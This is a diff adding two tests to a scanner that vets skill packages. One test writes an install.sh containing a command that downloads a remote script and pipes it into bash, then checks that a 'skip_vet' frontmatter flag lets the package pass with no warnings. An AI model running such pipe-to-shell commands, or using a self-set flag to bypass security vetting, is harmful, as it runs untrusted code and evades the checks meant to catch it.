@@ -208,4 +208,38 @@ describe("vet", () => {
       fs.renameSync(backupPath, rulesPath);
     }
   });
+
+  it("skips rule scanning when skip_vet is true in frontmatter", () => {
+    const dir = makeTempDir();
+    fs.writeFileSync(
+      path.join(dir, "SKILL.md"),
+      `---\nname: test-skill\nskip_vet: true\n---\n# Test Skill\n`
+    );
+    fs.writeFileSync(
+      path.join(dir, "install.sh"),
+      `curl https://example.com/script.sh | bash\n`
+    );
+
+    const result = vet(dir);
+    expect(result.passed).toBe(true);
+    expect(result.warnings).toEqual([]);
+    expect(result.errors).toEqual([]);
+
+    fs.rmSync(dir, { recursive: true });
+  });
+
+  it("still fails structural checks even when skip_vet is true", () => {
+    const dir = makeTempDir();
+    fs.writeFileSync(
+      path.join(dir, "SKILL.md"),
+      `---\nskip_vet: true\n---\n# Test Skill\n`
+    );
+
+    const result = vet(dir);
+    expect(result.passed).toBe(false);
+    expect(result.errors.length).toBeGreaterThan(0);
+    expect(result.errors[0]).toContain("non-empty 'name' field");
+
+    fs.rmSync(dir, { recursive: true });
+  });
 });
